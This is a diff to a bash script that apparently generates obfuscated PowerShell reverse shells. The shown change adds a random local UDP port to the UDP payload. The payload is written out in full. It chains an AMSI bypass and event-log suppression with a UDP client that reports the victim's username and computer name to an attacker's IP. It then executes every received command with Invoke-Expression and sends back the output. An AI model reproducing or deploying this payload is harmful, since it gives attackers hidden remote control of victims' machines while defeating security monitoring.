@@ -649,7 +649,7 @@ space=$(shuf -er -n$(shuf -i3-5 -n1)  {A..Z} {a..z} | tr -d '\n')
 buf=$(openssl rand -hex $(shuf -i 1-9 -n1))
 bytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
 assembly=$(openssl rand -hex $(shuf -i 7-19 -n1))
-
+uport=$(shuf -i9000-65536 -n1)
 
 
 #Clear Powershell Eventlogs
@@ -712,7 +712,7 @@ fi
 if [[ $4 == "udp" ]]
 then
     #UDP
-    shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient\"($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
+    shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient\"($uport, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
     
     elif [[ $4 == "tcp" ]]
 then    
